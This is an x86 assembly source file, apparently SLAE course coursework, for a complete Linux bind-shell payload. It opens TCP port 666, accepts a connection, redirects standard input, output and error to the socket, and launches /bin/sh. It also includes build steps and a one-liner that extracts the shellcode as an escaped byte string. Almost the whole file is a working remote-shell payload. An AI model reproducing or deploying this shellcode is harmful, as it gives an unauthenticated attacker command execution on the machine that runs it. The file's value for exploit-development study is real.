; Filename:      bind_tcp_shell.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  05.12.2018
; Note:          x86 code but assembled and linked on x64
; Assembler:     nasm -f elf32 bind_tcp_shell.nasm -o bind_tcp_shell.o
; Linker:        ld -m elf_i386 bind_tcp_shell.o -o bind_tcp_shell
; Assembly dump: objdump -d ./bind_tcp_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:

	; Create a UNIX socket (SYS_SOCKET)

	xor eax, eax      ; Clear eax register
	push eax          ; Push parameter to stack IPPROTO_IP = 0
	mov al, 0x66      ; sys_socketcall
	xor ebx, ebx      ; Clear ebx register
	mov bl, 0x1       ; SYS_SOCKET

	push 0x1          ; Push parameter to stack SOCK_STREAM = 1
	push 0x2          ; Push parameter to stack AF_INET = 2

	mov ecx, esp      ; ptr to stack

	int 0x80          ; syscall

	mov edx, eax      ; Save socket file descriptor (Server)


	; Bind the socket to a TCP port (SYS_BIND)

	xor eax, eax      ; Clear eax register
	push eax          ; Push parameter to stack INADDR_ANY = 0
	mov al, 0x66      ; sys_socketcall
	xor ebx, ebx      ; Clear ebx register
	mov bl, 0x2       ; SYS_BIND

	push WORD 0x9a02  ; port in byte reverse order = 666 = 0x29a
	push WORD 0x2     ; AF_INET = 2
	mov ecx, esp      ; ptr to stack

	push 0x10         ; 16 (socklen_t) =  Size of address
	push ecx          ; sockaddr_in struct pointer (struct sockaddr *)
	push edx          ; socket file descriptor (SYS_SOCKET)

	mov ecx, esp      ; ptr to stack

	int 0x80          ; syscall


	; Listen on TCP port (SYS_LISTEN)

	xor eax, eax      ; Clear eax register
	push eax          ; Push parameter to stack backlog = 0
	mov al, 0x66      ; sys_socketcall

	xor ebx, ebx      ; Clear ebx register
	mov bl, 0x4       ; SYS_LISTEN

	push edx          ; socket file descriptor (SYS_SOCKET)

	mov ecx, esp      ; ptr to stack

	int 0x80          ; syscall


	; Accept incoming connection (SYS_ACCEPT)

	xor eax, eax      ; Clear eax register
	push eax          ; Push parameter to stack 0
	push eax          ; Push parameter to stack 0
	mov al, 0x66      ; sys_socketcall

	xor ebx,ebx       ; Clear ebx register
	mov bl, 0x5       ; SYS_ACCEPT

	push edx          ; socket file descriptor (SYS_SOCKET)
	mov ecx, esp      ; ptr to stack

	int 0x80          ; syscall

	mov edx, eax      ; Save socket file descriptor (Client)


	; Duplicate file descriptor to client socket (dup2)

	; stdin
	xor eax, eax      ; Clear eax register
	mov al, 0x3f      ; sys_dup2
	mov ebx, edx      ; Socket file descriptor
	xor ecx, ecx      ; 0 = stdin

	int 0x80          ; syscall

	; stdout
	xor eax, eax      ; Clear eax register
	mov al, 0x3f      ; sys_dup2
	mov ebx, edx      ; Socket file descriptor
	xor ecx, ecx      ; Clear ecx register
	mov cl, 0x1       ; 1 = stdout

	int 0x80          ; syscall

	; stderr
	xor eax, eax      ; Clear eax register
	mov al, 0x3f      ; sys_dup2
	mov ebx, edx      ; Socket file descriptor
	xor ecx, ecx      ; Clear ecx register
	mov cl, 0x2       ; 2 = stderr

	int 0x80          ; syscall


	; Execute /bin/sh shell (execve)

	xor eax, eax      ; Clear eax register
	push eax          ; Null byte
	mov al, 0xb       ; sys_execve

	push 0x68732f2f   ; "inb/"
	push 0x6e69622f   ; "hs//"

	mov ebx, esp      ; ptr to "/bin//sh" string
	xor ecx, ecx      ; null ptr to argv
	xor edx, edx      ; null ptr to envp

	int 0x80          ; syscall
